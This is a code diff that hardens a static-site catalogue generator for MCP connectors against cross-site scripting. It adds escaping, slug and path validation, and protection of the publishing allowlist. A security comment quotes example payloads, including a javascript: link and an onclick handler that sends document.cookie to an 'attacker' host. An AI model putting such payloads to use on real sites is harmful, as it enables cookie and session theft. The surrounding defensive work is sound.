@@ -43,10 +43,23 @@ function readTextIfExists(path) {
   return readFileSync(path, 'utf8');
 }
 
+// Connectors deliberately omitted from the catalogue. Mirrors the
+// exclusion list in .github/workflows/ci.yml::discover-connectors so the
+// public site only advertises connectors that CI also validates.
+const CATALOGUE_EXCLUSIONS = new Set(['_template', 'google-workspace']);
+
 function listConnectors() {
   return readdirSync(connectorsDir)
-    .filter((name) => name !== '_template')
+    .filter((name) => !CATALOGUE_EXCLUSIONS.has(name))
     .filter((name) => statSync(join(connectorsDir, name)).isDirectory())
+    .filter((name) => {
+      if (CONNECTOR_SLUG_RE.test(name)) return true;
+      console.error(
+        `build-catalogue: refusing to render connector with non-slug name '${name}'. ` +
+          `Names must match ${CONNECTOR_SLUG_RE.source}.`
+      );
+      process.exit(1);
+    })
     .sort();
 }
 
@@ -145,32 +158,134 @@ const SURFACE_LABELS = {
   TBD: 'TBD',
 };
 
+// SECURITY: anything in this file that is reachable from a connector PR
+// is PR-controlled input. After kramdown renders the page, a malicious
+// Markdown link like `[click](javascript:alert(document.cookie))`, an
+// inline `<script>` tag, or a kramdown Inline Attribute List such as
+// `text{:onclick="fetch('https://attacker/'+document.cookie)"}` would
+// execute in any visitor's browser. We do NOT rely on Jekyll's
+// `safe: true` for this — that flag is about plugin loading, not
+// link-scheme filtering.
+//
+// The full list of PR-controlled values rendered by this script:
+//   - tagline                  (README first paragraph)
+//   - positioning              (italic line after the tagline)
+//   - description              (package.json fallback for tagline)
+//   - tools.domains[]          (STATUS.json)
+//   - hostsTested[]            (when not in HOST_LABELS)
+//   - auth.type                (when not in AUTH_LABELS)
+//   - auth.envVars[]           (server.json — typed by registry validator)
+//   - surface                  (when not in SURFACE_LABELS)
+//   - name, package, version   (package.json / STATUS.json identifiers)
+//   - evidence.{changelog,tools,auth,tests} (STATUS.json paths)
+//
+// sanitise() HTML-entity-escapes every character that kramdown uses for
+// syntax, AND collapses all whitespace into single spaces so a JSON value
+// with embedded `\n` cannot create a new Markdown block (closing a table
+// row, starting an unrelated paragraph, or attaching a kramdown IAL block):
+//   `&` (must come first so the other escapes aren't double-encoded)
+//   `<`, `>`                  (HTML tags / autolinks)
+//   `[`, `]`                  (link / reference syntax)
+//   `(`, `)`                  (inline link URL delimiter)
+//   `{`, `}`                  (kramdown IAL/BAL attribute lists)
+//   `` ` ``                   (inline-code span; protects backtick-wrapped contexts)
+//   `|`                       (table-cell separator)
+//   any \s+                   collapsed to a single space (one-line invariant)
+//
+// Trade-off: an intentional Markdown link inside a tagline (e.g. browser-
+// automation's '[agent-browser](https://npmjs.com/...)') renders as literal
+// text rather than a clickable link. That is the deliberate cost of refusing
+// to parse any link from a PR-controlled value. Visitors can click through
+// to the connector's README to follow the real link.
+//
+// We use numeric HTML entities (&#NN;) rather than named entities for the
+// bracket / paren / brace chars because kramdown processes named entities
+// in some inline contexts, while &#NN; passes through unchanged into the
+// rendered HTML and is decoded back to the visible character by the
+// browser at display time — after kramdown's link-parsing phase has
+// already finished.
+//
+// Reference: https://owasp.org/www-community/attacks/xss/
+const ENTITY_MAP = {
+  '&': '&amp;',
+  '<': '&lt;',
+  '>': '&gt;',
+  '[': '&#91;',
+  ']': '&#93;',
+  '(': '&#40;',
+  ')': '&#41;',
+  '{': '&#123;',
+  '}': '&#125;',
+  '`': '&#96;',
+};
+
+function sanitise(text) {
+  if (text === null || text === undefined) return null;
+  return String(text)
+    .replace(/[&<>\[\](){}`]/g, (c) => ENTITY_MAP[c])
+    .replace(/\|/g, '\\|')
+    .replace(/\s+/g, ' ')
+    .trim();
+}
+
+// URL-encode a path fragment for use as part of an http(s) URL. PR-controlled
+// values (e.g. STATUS.json's evidence paths) flow through here before being
+// embedded in a Markdown link target so the URL parser cannot be tricked into
+// closing the parenthetical early or attaching a query string. Path separators
+// are deliberately preserved because evidence values are file paths.
+function encodeUrlPath(text) {
+  if (text === null || text === undefined) return '';
+  return String(text)
+    .split('/')
+    .map((seg) => encodeURIComponent(seg))
+    .join('/');
+}
+
+// Connector directory names — independent slug guard so build-catalogue.mjs
+// does not depend on the ci.yml discover step for safety. Mirrors the
+// regex in .github/workflows/ci.yml::discover-connectors and
+// .github/workflows/changelog-check.yml.
+const CONNECTOR_SLUG_RE = /^[a-z0-9][a-z0-9-]*$/;
+
+// Env var identifiers — uppercase letters, digits, underscores. Mirrors
+// the convention enforced by the MCP registry server.json validator.
+const ENV_VAR_RE = /^[A-Z][A-Z0-9_]*$/;
+
+// SemVer-ish — accept anything check-status.mjs would accept as a version
+// (which currently is strict equality across package.json, server.json,
+// and STATUS.json; we additionally reject anything with whitespace or
+// table-control characters). This is paranoia, not validation.
+const SEMVER_LIKE_RE = /^[A-Za-z0-9.+\-_]+$/;
+
 function formatHosts(hosts) {
   if (!hosts || hosts.length === 0) return '—';
-  return hosts.map((h) => HOST_LABELS[h] ?? h).join(', ');
+  return hosts.map((h) => HOST_LABELS[h] ?? sanitise(h)).join(', ');
 }
 
 function formatAuth(auth) {
   if (!auth || !auth.type) return '—';
-  return AUTH_LABELS[auth.type] ?? auth.type;
+  return AUTH_LABELS[auth.type] ?? sanitise(auth.type);
 }
 
 function formatSurface(surface) {
   if (!surface) return '—';
-  return SURFACE_LABELS[surface] ?? surface;
+  return SURFACE_LABELS[surface] ?? sanitise(surface);
 }
 
 function indexPage(connectors) {
   const rows = connectors
     .map((c) => {
+      // c.name is slug-validated by listConnectors() in this file (not just
+      // by ci.yml::discover-connectors — the catalogue defends itself).
       const link = `[${c.name}](./catalogue/${c.name}.html)`;
       const auth = formatAuth(c.auth);
-      const tools = c.tools?.count ?? '—';
+      // tools.count is checked === actual count by check-status.mjs, so the
+      // value is structurally a number. Coerce defensively.
+      const tools = Number.isInteger(c.tools?.count) ? c.tools.count : '—';
       const surface = formatSurface(c.surface);
-      const version = c.version ?? '—';
-      const tagline = c.tagline ?? c.description ?? '';
-      const taglineCol = tagline ? tagline.replace(/\|/g, '\\|') : '—';
-      return `| ${link} | ${taglineCol} | ${version} | ${auth} | ${tools} | ${surface} |`;
+      const version = SEMVER_LIKE_RE.test(String(c.version)) ? c.version : '—';
+      const tagline = sanitise(c.tagline ?? c.description) || '—';
+      return `| ${link} | ${tagline} | ${version} | ${auth} | ${tools} | ${surface} |`;
     })
     .join('\n');
 
@@ -204,23 +319,97 @@ ${rows}
 `;
 }
 
+// Allowed shape for evidence.* paths in STATUS.json. Restricts to
+// repo-relative segments: letters, digits, dot, hyphen, underscore,
+// forward slash. This is a defence-in-depth check at render time;
+// scripts/check-status.mjs should also validate this in a follow-up so
+// the failure surfaces at PR time rather than at catalogue render.
+const EVIDENCE_PATH_RE = /^[A-Za-z0-9_.\/-]+$/;
+
+// Build a Markdown link row for the Evidence table. Both the visible
+// label and the URL fragment derive from STATUS.json (PR-controlled).
+// The label is rendered inside a backtick code-span AFTER asserting the
+// path matches EVIDENCE_PATH_RE (no Markdown syntax characters can
+// survive); the URL fragment is URL-encoded segment-by-segment so a
+// malicious path cannot close the parenthetical early.
+function evidenceLinkRow(label, repoRelativePath) {
+  const cleanPath = String(repoRelativePath).replace(/^\.\//, '');
+  if (!EVIDENCE_PATH_RE.test(cleanPath)) {
+    // Refuse to render rather than risk a kramdown escape via a hostile path.
+    // The label still renders so the row's absence is visible.
+    return `| ${label} | — (evidence path rejected) |`;
+  }
+  const urlPath = encodeUrlPath(cleanPath);
+  return `| ${label} | [\`${cleanPath}\`](${REPO_URL}/tree/main/${urlPath}) |`;
+}
+
 function connectorPage(c) {
+  // c.name is slug-validated by listConnectors() before reaching here.
+  const baseRepoPath = `connectors/${c.name}`;
+
   const evidenceRows = [];
-  if (c.evidence?.changelog) evidenceRows.push(`| Changelog | [\`CHANGELOG.md\`](${REPO_URL}/blob/main/connectors/${c.name}/CHANGELOG.md) |`);
-  if (c.evidence?.tools) evidenceRows.push(`| Tools source | [\`${c.evidence.tools.replace(/^\.\//, '')}\`](${REPO_URL}/tree/main/connectors/${c.name}/${c.evidence.tools.replace(/^\.\//, '')}) |`);
-  if (c.evidence?.tests) evidenceRows.push(`| Tests | [\`${c.evidence.tests.replace(/^\.\//, '')}\`](${REPO_URL}/tree/main/connectors/${c.name}/${c.evidence.tests.replace(/^\.\//, '')}) |`);
-  if (c.statusJsonUrl) evidenceRows.push(`| Machine-readable status | [\`STATUS.json\`](${c.statusJsonUrl}) |`);
-  if (c.serverJsonUrl) evidenceRows.push(`| MCP server manifest | [\`server.json\`](${c.serverJsonUrl}) |`);
-  if (c.npmUrl) evidenceRows.push(`| npm package | [${c.package}](${c.npmUrl}) |`);
-  evidenceRows.push(`| Source directory | [\`connectors/${c.name}/\`](${c.sourceUrl}) |`);
+  if (c.evidence?.changelog) {
+    evidenceRows.push(
+      `| Changelog | [\`CHANGELOG.md\`](${REPO_URL}/blob/main/${baseRepoPath}/CHANGELOG.md) |`
+    );
+  }
+  if (c.evidence?.tools) {
+    evidenceRows.push(
+      evidenceLinkRow('Tools source', `${baseRepoPath}/${String(c.evidence.tools).replace(/^\.\//, '')}`)
+    );
+  }
+  if (c.evidence?.tests) {
+    evidenceRows.push(
+      evidenceLinkRow('Tests', `${baseRepoPath}/${String(c.evidence.tests).replace(/^\.\//, '')}`)
+    );
+  }
+  if (c.statusJsonUrl) {
+    evidenceRows.push(`| Machine-readable status | [\`STATUS.json\`](${c.statusJsonUrl}) |`);
+  }
+  if (c.serverJsonUrl) {
+    evidenceRows.push(`| MCP server manifest | [\`server.json\`](${c.serverJsonUrl}) |`);
+  }
+  if (c.npmUrl && c.package) {
+    // c.package is sanitise()d for the link label — it's a registered npm
+    // scope name (already constrained by `npm publish`) but defence-in-depth.
+    const displayPackage = sanitise(c.package);
+    evidenceRows.push(`| npm package | [${displayPackage}](${c.npmUrl}) |`);
+  }
+  evidenceRows.push(`| Source directory | [\`${baseRepoPath}/\`](${c.sourceUrl}) |`);
   evidenceRows.push(`| README | [\`README.md\`](${c.readmeUrl}) |`);
 
-  const authEnvVars = (c.auth?.envVars ?? []).map((n) => `\`${n}\``).join(', ') || '—';
-  const domains = c.tools?.domains?.length ? c.tools.domains.join(', ') : '—';
+  // Env-var names: validate against the registry-style identifier regex and
+  // silently drop any name that fails. A malformed env var name is a CI
+  // bug, not a display problem — server-json-check.yml will fail the PR
+  // separately on the same input.
+  const authEnvVars =
+    (c.auth?.envVars ?? [])
+      .filter((n) => typeof n === 'string' && ENV_VAR_RE.test(n))
+      .map((n) => `\`${n}\``)
+      .join(', ') || '—';
+  const domains = c.tools?.domains?.length
+    ? c.tools.domains
+        .map(sanitise)
+        .filter((v) => v && v.length > 0)
+        .join(', ')
+    : '—';
 
   const pendingNotice = c.hasStatus
     ? ''
     : `\n> **Status: pending.** This connector does not yet have a \`STATUS.json\`. The values below are derived from \`package.json\` and \`server.json\` and have not been editorially reviewed.\n`;
+
+  const tagline = sanitise(c.tagline ?? c.description) || '';
+  const positioning = sanitise(c.positioning);
+  const version = SEMVER_LIKE_RE.test(String(c.version)) ? c.version : '—';
+  const toolCount = Number.isInteger(c.tools?.count) ? c.tools.count : '—';
+
+  // Install section requires a package name. If it's missing (typically
+  // because the connector predates STATUS.json AND has no package.json
+  // name yet), render guidance rather than `npx -y null`.
+  const installBlock =
+    c.package && typeof c.package === 'string' && c.package.length > 0
+      ? `\`\`\`bash\nnpx -y ${c.package}\n\`\`\`\n\nAdd to your MCP host configuration; see the [README](${c.readmeUrl}) for full setup, environment variables, and host-specific examples.`
+      : `_Package name not yet set in_ \`package.json\`_. See the [README](${c.readmeUrl}) for install instructions._`;
 
   return `---
 layout: default
@@ -229,17 +418,17 @@ title: ${c.name} — mcp-servers catalogue
 
 # ${c.name}
 
-${c.tagline ?? c.description ?? ''}
+${tagline}
 
-${c.positioning ? `*${c.positioning}*` : ''}
+${positioning ? `*${positioning}*` : ''}
 ${pendingNotice}
 ## Status
 
 | Field | Value |
 |-------|-------|
-| Version | ${c.version ?? '—'} |
+| Version | ${version} |
 | Auth | ${formatAuth(c.auth)} (${authEnvVars}) |
-| Tools | ${c.tools?.count ?? '—'} (${domains}) |
+| Tools | ${toolCount} (${domains}) |
 | Surface | ${formatSurface(c.surface)} |
 | Hosts tested | ${formatHosts(c.hostsTested)} |
 
@@ -251,11 +440,7 @@ ${evidenceRows.join('\n')}
 
 ## Install
 
-\`\`\`bash
-npx -y ${c.package}
-\`\`\`
-
-Add to your MCP host configuration; see the [README](${c.readmeUrl}) for full setup, environment variables, and host-specific examples.
+${installBlock}
 
 ## Back to catalogue
 
@@ -263,31 +448,11 @@ Add to your MCP host configuration; see the [README](${c.readmeUrl}) for full se
 `;
 }
 
-function jekyllConfig() {
-  return `# Generated alongside docs/catalogue/. Edit scripts/build-catalogue.mjs.
-title: mcp-servers catalogue
-description: Source-available MCP servers by Mindstone — machine-readable index.
-url: https://mindstone.github.io
-baseurl: /mcp-servers
-theme: jekyll-theme-minimal
-markdown: kramdown
-permalink: /:path/:basename:output_ext
-
-# Allowlist: only these paths are published. Everything else under docs/ stays
-# in-repo (and browseable on github.com) but is NOT served by GitHub Pages.
-# This is deliberate — docs/ contains internal release-operations runbooks
-# (PUBLISH_APPROVAL_PROCESS.md, EMERGENCY_REVOKE.md, plans/), security audits,
-# and a Jekyll-incompatible JSON schema that must not appear on the public site.
-exclude:
-  - '*'
-  - '*/'
-
-include:
-  - index.md
-  - catalogue
-  - assets
-`;
-}
+// NOTE: docs/_config.yml is intentionally NOT regenerated by this script.
+// The Jekyll config controls which paths get published, and it is a
+// human-review surface — weakening the allowlist must be visible in a PR
+// diff, not buried inside a generator template. If you need to change
+// Jekyll settings, edit docs/_config.yml directly.
 
 function ensureDir(p) {
   if (!existsSync(p)) mkdirSync(p, { recursive: true });
@@ -313,12 +478,25 @@ const connectors = listConnectors().map(buildConnectorInfo);
 
 let drifted = false;
 
-drifted = writeIfChanged(join(docsDir, '_config.yml'), jekyllConfig()) || drifted;
+// Hard requirement: the Jekyll config must exist on disk. We don't write
+// it (per the note above) but we do require it to be present, because
+// without it Pages would publish docs/ wholesale.
+const configPath = join(docsDir, '_config.yml');
+if (!existsSync(configPath)) {
+  console.error(
+    `build-catalogue: ${configPath} is missing. ` +
+      `This file is required and is intentionally NOT regenerated by this script — ` +
+      `add it by hand (see the canonical version in git history).`
+  );
+  process.exit(1);
+}
+
 drifted = writeIfChanged(join(docsDir, 'index.md'), indexPage(connectors)) || drifted;
 ensureDir(catalogueDir);
 
-// Track files we own so we can prune stale per-connector pages.
-const owned = new Set([join(docsDir, '_config.yml'), join(docsDir, 'index.md')]);
+// Track files we own so we can prune stale per-connector pages. We do NOT
+// own _config.yml.
+const owned = new Set([join(docsDir, 'index.md')]);
 
 for (const c of connectors) {
   const out = join(catalogueDir, `${c.name}.md`);
